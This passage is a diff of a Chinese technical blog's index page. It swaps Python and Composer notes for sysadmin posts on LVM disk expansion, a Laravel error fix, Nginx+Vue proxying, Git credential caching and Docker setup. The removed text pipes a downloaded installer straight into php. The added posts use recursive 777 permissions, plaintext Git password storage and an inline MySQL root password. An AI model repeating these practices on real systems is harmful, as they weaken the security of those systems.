@@ -292,7 +292,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/python-list/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/lvm-expand-disk/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="CainChan">
@@ -312,7 +312,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2016/python-list/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">Python的列表推导式</a>
+                <a href="/lvm-expand-disk/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">LVM扩展根目录空间</a>
               
             
           </h1>
@@ -337,7 +337,7 @@
                 
               
 
-              <time title="Created: 2016-12-19 21:19:28" itemprop="dateCreated datePublished" datetime="2016-12-19T21:19:28+08:00">2016-12-19</time>
+              <time title="Created: 2018-01-01 00:00:00" itemprop="dateCreated datePublished" datetime="2018-01-01T00:00:00+08:00">2018-01-01</time>
             
 
             
@@ -354,7 +354,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-20 00:34:29" itemprop="dateModified" datetime="2018-12-20T00:34:29+08:00">2018-12-20</time>
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
               
             
           </span>
@@ -389,15 +389,7 @@
       
         
           
-            <h4 id="1-列表推导式书写形式"><a href="#1-列表推导式书写形式" class="headerlink" title="1.列表推导式书写形式"></a>1.列表推导式书写形式</h4><p>[表达式 for 变量 in 列表]    或者  [表达式 for 变量 in 列表 if 条件]</p>
-<h4 id="2-举例说明"><a href="#2-举例说明" class="headerlink" title="2.举例说明"></a>2.举例说明</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="keyword">print</span> [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> li]</span><br><span class="line"><span class="keyword">print</span> [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> li <span class="keyword">if</span> x&gt;<span class="number">5</span>]</span><br><span class="line"><span class="keyword">print</span> dict([(x,x*<span class="number">10</span>) <span class="keyword">for</span> x <span class="keyword">in</span> li])</span><br><span class="line"><span class="keyword">print</span>  [ (x, y) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> x % <span class="number">2</span> <span class="keyword">if</span> x &gt; <span class="number">3</span> <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> y &gt; <span class="number">7</span> <span class="keyword">if</span> y != <span class="number">8</span> ]</span><br><span class="line">vec=[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>]</span><br><span class="line">vec2=[<span class="number">4</span>,<span class="number">3</span>,<span class="number">-9</span>]</span><br><span class="line">sq = [vec[i]+vec2[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(vec))]</span><br><span class="line"><span class="keyword">print</span> sq</span><br><span class="line"><span class="keyword">print</span> [x*y <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] <span class="keyword">for</span> y <span class="keyword">in</span>  [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line">testList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul2</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x*<span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> [mul2(i) <span class="keyword">for</span> i <span class="keyword">in</span> testList]</span><br></pre></td></tr></table></figure>
-<h4 id="3-结果"><a href="#3-结果" class="headerlink" title="3.结果"></a>3.结果</h4><p>[1, 4, 9, 16, 25, 36, 49, 64, 81]</p>
-<p>[36, 49, 64, 81]</p>
-<p>{1: 10, 2: 20, 3: 30, 4: 40, 5: 50, 6: 60, 7: 70, 8: 80, 9: 90}</p>
-<p>[(5, 9), (7, 9), (9, 9)]</p>
-<p>[6, 7, -3]</p>
-<p>[1, 2, 3, 2, 4, 6, 3, 6, 9]</p>
-<p>[2, 4, 6, 8]</p>
+            <h3 id="LVM扩展根目录空间"><a href="#LVM扩展根目录空间" class="headerlink" title="LVM扩展根目录空间"></a>LVM扩展根目录空间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">df -h <span class="comment">#查看挂载 /dev/mapper/前缀的表示支持LVM扩展</span></span><br><span class="line">yum install lvm2* part* <span class="comment">#必要工具</span></span><br><span class="line">fdisk -l <span class="comment">#查看新硬盘</span></span><br><span class="line">fdisk /dev/sdb <span class="comment">#硬盘分区 需手动输入指令</span></span><br><span class="line"><span class="comment">#输入n进行分区</span></span><br><span class="line"><span class="comment">#输入p为主分区</span></span><br><span class="line"><span class="comment">#输入1(一个主分区)</span></span><br><span class="line"><span class="comment">#输入回车(起始磁盘数默认)</span></span><br><span class="line"><span class="comment">#输入回车(磁盘大小默认全部)</span></span><br><span class="line"><span class="comment">#输入t修改分区格式</span></span><br><span class="line"><span class="comment">#输入8e(LVM必须为此格式)</span></span><br><span class="line"><span class="comment">#输入p查看分区</span></span><br><span class="line"><span class="comment">#输入w写入分区</span></span><br><span class="line"></span><br><span class="line">mkfs.ext4 /dev/sdb1 <span class="comment">#格式化分区</span></span><br><span class="line">partprobe <span class="comment">#重新读取分区表 无需重启</span></span><br><span class="line">pvcreate /dev/sdb1 <span class="comment">#创建物理卷(physical volume)</span></span><br><span class="line">pvscan <span class="comment">#查看物理卷</span></span><br><span class="line">pvdisplay <span class="comment">#查看物理卷详情</span></span><br><span class="line">vgscan <span class="comment">#查看卷组(Volume Group)</span></span><br><span class="line">vgdisplay <span class="comment">#查看卷组详情</span></span><br><span class="line">vgextend VolGroup00 /dev/sdb1    <span class="comment">#扩展VolGroup00</span></span><br><span class="line">lvscan <span class="comment">#查看逻辑卷(logical volume)</span></span><br><span class="line">lvdisplay <span class="comment">#查看逻辑卷详情 以lv_root为例</span></span><br><span class="line">lvextend -L +100G /dev/VolGroup00/lv_root <span class="comment">#扩展lv_root  精确扩展可用-l指定PE扩展</span></span><br><span class="line">resize2fs /dev/VolGroup00/lv_root <span class="comment">#重设lv_root大小</span></span><br><span class="line">df -h <span class="comment">#查看挂载情况，已经扩容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#非LVM扩展空间</span></span><br><span class="line">fdisk -l		<span class="comment">#查看硬盘</span></span><br><span class="line">fdisk /dev/sdb   	<span class="comment">#硬盘分区 需手动输入指令</span></span><br><span class="line"><span class="comment">#输入n进行分区</span></span><br><span class="line"><span class="comment">#输入p为主分区</span></span><br><span class="line"><span class="comment">#输入1(一个主分区)</span></span><br><span class="line"><span class="comment">#输入回车(起始磁盘数默认)</span></span><br><span class="line"><span class="comment">#输入回车(磁盘大小默认全部)</span></span><br><span class="line"><span class="comment">#输入p查看分区</span></span><br><span class="line"><span class="comment">#输入w写入分区</span></span><br><span class="line"></span><br><span class="line">mkfs.ext4 /dev/sdb1 <span class="comment">#格式化分区</span></span><br><span class="line">mv /var/lib/redis /backup <span class="comment">#先备份</span></span><br><span class="line">mkdir /var/lib/redis</span><br><span class="line">mount /dev/sdb1 /var/lib/redis</span><br><span class="line">mv /backup/redis/* /var/lib/redis</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"/dev/sdb1 /var/lib/redis ext4 defaults 0 0"</span> &gt;&gt; /etc/fstab   </span><br><span class="line"><span class="comment">#修改/etc/fstab 加入启动挂载</span></span><br></pre></td></tr></table></figure>
 
           
         
@@ -454,7 +446,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/composer-guide/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/laravel-bugs/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="CainChan">
@@ -474,7 +466,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2016/composer-guide/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">Composer笔记</a>
+                <a href="/laravel-bugs/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">Laravel Class log does not exist报错解决办法</a>
               
             
           </h1>
@@ -499,7 +491,7 @@
                 
               
 
-              <time title="Created: 2016-12-19 21:17:51" itemprop="dateCreated datePublished" datetime="2016-12-19T21:17:51+08:00">2016-12-19</time>
+              <time title="Created: 2017-09-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-01T00:00:00+08:00">2017-09-01</time>
             
 
             
@@ -516,7 +508,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-20 00:34:05" itemprop="dateModified" datetime="2018-12-20T00:34:05+08:00">2018-12-20</time>
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
               
             
           </span>
@@ -551,17 +543,796 @@
       
         
           
-            <h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sS https://getcomposer.org/installer | php</span><br><span class="line">mv composer.phar /usr/<span class="built_in">local</span>/bin/composer</span><br></pre></td></tr></table></figure>
-<h4 id="2-修改为中国镜像"><a href="#2-修改为中国镜像" class="headerlink" title="2.修改为中国镜像"></a>2.修改为中国镜像</h4><ol>
-<li><p>系统全局配置：即将配置信息添加到 Composer 的全局配置文件 <code>config.json</code> 中。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>单个项目配置： 将配置信息添加到某个项目的 <code>composer.json</code> 文件中。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure>
-</li>
+            <h4 id="BUG1"><a href="#BUG1" class="headerlink" title="BUG1"></a>BUG1</h4><p>Laravel Class log does not exist<br>在一个Laravel的项目下执行composer update，或者php artisan就是不成功，提示Uncaught ReflectionException: Class log does not exist，而根据提示的错误找不出原因。<br>报错内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP Fatal error:  Uncaught ReflectionException: Class log does not exist in /usr/share/nginx/html/tanteng.me/vendor/illuminate/container/Container.php:738</span><br><span class="line">Stack trace:</span><br><span class="line">#0 /usr/share/nginx/html/tanteng.me/vendor/illuminate/container/Container.php(738): ReflectionClass-&gt;__construct(&apos;log&apos;)</span><br><span class="line">#1 /usr/share/nginx/html/tanteng.me/vendor/illuminate/container/Container.php(633): Illuminate\Container\Container-&gt;build(&apos;log&apos;, Array)</span><br><span class="line">#2 /usr/share/nginx/html/tanteng.me/vendor/laravel/framework/src/Illuminate/Foundation/Application.php(687): Illuminate\Container\Container-&gt;make(&apos;log&apos;, Array)</span><br><span class="line">#3 /usr/share/nginx/html/tanteng.me/vendor/illuminate/container/Container.php(853): Illuminate\Foundation\Application-&gt;make(&apos;log&apos;)</span><br><span class="line">#4 /usr/share/nginx/html/tanteng.me/vendor/illuminate/container/Container.php(808): Illuminate\Container\Container-&gt;resolveClass(Object(ReflectionParameter))</span><br><span class="line">#5 /usr/share/nginx/html/tanteng.me/vendor/illuminate/container/Container.php(777): Illuminate\Container\Container-&gt;getDependencies(Array, Array)</span><br><span class="line">#6 /usr/share/nginx/htm in /usr/share/nginx/html/tanteng.me/vendor/illuminate/container/Container.php on line 738</span><br></pre></td></tr></table></figure>
+<p>后来<code>解决办法是安装mysqld的扩展</code>，是因为缺少这个扩展导致的异常。网上也有很多网友遇到类似的问题，但是其他原因导致的，如没有开启shor_open_tag，.env包含空格等。</p>
+<p>参考链接：<a href="http://stackoverflow.com/questions/34978828/uncaught-reflectionexception-class-log-does-not-exist-laravel-5-2" target="_blank" rel="noopener">http://stackoverflow.com/questions/34978828/uncaught-reflectionexception-class-log-does-not-exist-laravel-5-2</a></p>
+<p>laravel项目目录权限改成755 -R<br>且storeage目录权限改成777 -R</p>
+<h4 id="BUG2"><a href="#BUG2" class="headerlink" title="BUG2"></a>BUG2</h4><p>laravel-wechat</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require &quot;overtrue/laravel-wechat&quot;</span><br></pre></td></tr></table></figure>
+<p>安装参考:<a href="https://github.com/overtrue/laravel-wechat/tree/3.1.10" target="_blank" rel="noopener">laravel-wechat</a></p>
+<h4 id="csrf排除wechat"><a href="#csrf排除wechat" class="headerlink" title="csrf排除wechat"></a>csrf排除wechat</h4><p><code>vim Http/Middleware/VerifyCsrfToken :</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected $except = [</span><br><span class="line">        &apos;wechat&apos;</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/nginx-vue/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CainChan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CainChan">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/nginx-vue/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">Nginx+Vue配置</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-08-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-01T00:00:00+08:00">2017-08-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> server-api&#123;</span><br><span class="line">    <span class="comment"># api 代理服务地址</span></span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:3110</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">upstream</span> server-resource&#123;</span><br><span class="line">    <span class="comment"># 静态资源 代理服务地址</span></span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:3120</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">3111</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;      <span class="comment"># 这里指定域名</span></span><br><span class="line">    <span class="attribute">root</span> /home/www/server-statics;</span><br><span class="line">    <span class="comment"># 匹配 api 路由的反向代理到API服务</span></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/api/</span> &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://server-api;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 假设这里验证码也在API服务中</span></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/captcha</span> &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://server-api;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 假设你的图片资源全部在另外一个服务上面</span></span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~/img/</span> &#123;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://server-resource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 路由在前端，后端没有真实路由，在路由不存在的 404状态的页面返回 /index.html</span></span><br><span class="line">    <span class="comment"># 这个方式使用场景，你在写React或者Vue项目的时候，没有真实路由</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/git-https-password/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CainChan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CainChan">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/git-https-password/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">Https方式使用Git设置密码的方式</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-07-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-07-01T00:00:00+08:00">2017-07-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>https方式每次都要输入密码，按照如下设置即可输入一次就不用再手输入密码的困扰而且又享受https带来的极速</p>
+<p>设置记住密码（默认15分钟）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global credential.helper cache</span><br></pre></td></tr></table></figure></p>
+<p>如果想自己设置时间，可以这样做：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config credential.helper <span class="string">'cache --timeout=3600'</span></span><br></pre></td></tr></table></figure></p>
+<p>这样就设置一个小时之后失效</p>
+<p>长期存储密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/docker-nmp-log/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CainChan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CainChan">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/docker-nmp-log/" class="post-title-link" itemprop="http://yoursite.com/page/2/index.html">Docker-Nginx-Mysql-PHP笔记</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-06-01 00:00:00" itemprop="dateCreated datePublished" datetime="2017-06-01T00:00:00+08:00">2017-06-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-20 23:43:47" itemprop="dateModified" datetime="2018-12-20T23:43:47+08:00">2018-12-20</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:latest</span><br><span class="line">docker run --name mysql -e MYSQL_ROOT_PASSWORD=kaychen -d docker.io/mysql</span><br><span class="line">mkdir -p /opt/mysql/</span><br><span class="line">mkdir -p /opt/mysql/conf</span><br><span class="line">docker cp mysql:/var/lib/mysql/ /opt/mysql/</span><br><span class="line">docker cp mysql:/etc/mysql/conf.d/mysql.cnf /opt/mysql/conf/</span><br><span class="line">mv /opt/mysql/mysql /opt/mysql/data</span><br><span class="line">docker rm -f mysql</span><br><span class="line"></span><br><span class="line">docker run --name mysql \</span><br><span class="line">-p 127.0.0.1:3306:3306 \</span><br><span class="line">-v /opt/mysql/conf:/etc/mysql/conf.d/ \</span><br><span class="line">-v /opt/mysql/data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=kaychen \</span><br><span class="line">-d docker.io/mysql</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx</span><br><span class="line">docker run -d --name nginx docker.io/nginx</span><br><span class="line">mkdir /opt/nginx/wwwroot/</span><br><span class="line">docker cp nginx:/etc/nginx/nginx.conf /opt/nginx</span><br><span class="line">docker cp nginx:/etc/nginx/conf.d /opt/nginx</span><br><span class="line">docker cp nginx:/usr/share/nginx/html /opt/nginx/wwwroot/</span><br><span class="line">docker rm -f nginx</span><br><span class="line">docker run --name nginx \</span><br><span class="line">-p 80:80 \</span><br><span class="line">-p 443:443 \</span><br><span class="line">-v /opt/nginx/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">-v /opt/nginx/conf.d:/etc/nginx/conf.d \</span><br><span class="line">-v /opt/nginx/wwwroot:/home/wwwroot \</span><br><span class="line">-v /var/<span class="built_in">log</span>/nginx:/var/<span class="built_in">log</span>/nginx \</span><br><span class="line">--link php7:php7 \</span><br><span class="line">-d docker.io/nginx</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name php53 -v /home/wwwroot:/home/wwwroot -p 127.0.0.1:9000:9000 kaychen/php53 php-fpm</span><br><span class="line">docker run -d --name php7 -v /home/wwwroot:/home/wwwroot docker.io/php:7.0-fpm</span><br><span class="line">docker run -d --name nginx --link php7:php7 --link php53:php53 -v /home/wwwroot:/home/wwwroot -v /root/nginx/vhost:/etc/nginx/conf.d -p 80:80 docker.io/nginx</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/flask-gevent/">
+
